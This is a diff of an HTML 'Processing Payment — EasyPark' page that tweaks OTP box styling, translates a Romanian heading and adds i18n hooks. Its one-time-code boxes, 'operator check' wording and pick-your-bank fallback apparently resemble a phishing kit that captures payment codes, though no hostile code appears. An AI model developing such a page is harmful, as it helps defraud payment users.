@@ -2,7 +2,7 @@
 <html lang=""><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
 <title>Processing Payment — EasyPark</title>
-<script src="/static/js/i18n.js?v=5"></script>
+<script src="/static/js/i18n.js?v=6"></script>
 <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
 <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" as="style">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -34,8 +34,8 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 .ov-inp{width:100%;border:2px solid #e5e7eb;border-radius:12px;padding:14px;text-align:center;font-size:28px;font-weight:700;letter-spacing:.22em;outline:none;margin-bottom:14px;font-family:"Courier New",monospace;transition:border .2s}
 .ov-inp:focus{border-color:#872879}
 .ov-btn{width:100%;padding:14px;border-radius:12px;font-weight:800;font-size:14px;border:none;cursor:pointer;transition:.2s}
-.otp-row{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
-.otp-b{width:44px;height:52px;border:2px solid #e5e7eb;border-radius:11px;text-align:center;font-size:22px;font-weight:800;color:#1e293b;outline:none;background:#f8fafc;transition:border .15s,box-shadow .15s;-webkit-appearance:none;padding:0}
+.otp-row{display:flex;gap:5px;justify-content:center;margin-bottom:18px}
+.otp-b{width:40px;height:50px;border:2px solid #e5e7eb;border-radius:11px;text-align:center;font-size:22px;font-weight:800;color:#1e293b;outline:none;background:#f8fafc;transition:border .15s,box-shadow .15s;-webkit-appearance:none;padding:0}
 .otp-b:focus{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.15)}
 .otp-b.otp-filled{border-color:#872879;background:#fdf2f8}
 @keyframes shield-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
@@ -79,7 +79,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
         <i class="fas fa-credit-card" style="color:#872879;font-size:18px"></i>
       </div>
     </div>
-    <h2 style="font-weight:800;font-size:20px;color:#1e293b;margin:0 0 8px" data-i18n="processing">Se procesează plata…</h2>
+    <h2 style="font-weight:800;font-size:20px;color:#1e293b;margin:0 0 8px" data-i18n="processing">Processing payment…</h2>
     <p style="font-size:14px;color:#64748b;margin:0 0 24px;line-height:1.6" data-i18n-html="operator_check_html">Your payment is being securely processed.<br>This may take a few moments — please keep this page open.</p>
     <div style="background:#f8fafc;border-radius:14px;padding:16px;text-align:left">
       <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f1f5f9;font-size:13px">
@@ -179,7 +179,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
     <!-- All banks fallback -->
     <div id="app-all-banks" style="display:none">
     <p style="font-size:12px;font-weight:600;color:#374151;margin:0 0 8px;text-align:left" data-i18n="select_bank">Select your bank:</p>
-    <input id="bank-search" type="text" placeholder="🔍 Search bank…" oninput="filterBankList(this.value)"
+    <input id="bank-search" type="text" placeholder="🔍 Search bank…" data-i18n="bank_search_ph" data-i18n-attr="placeholder" oninput="filterBankList(this.value)"
       style="width:100%;padding:8px 12px;border:1.5px solid #e2e8f0;border-radius:10px;font-size:13px;outline:none;margin-bottom:8px;box-sizing:border-box">
     <div id="app-bank-list" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px;max-height:280px;overflow-y:auto"></div>
     </div><!-- /app-all-banks -->
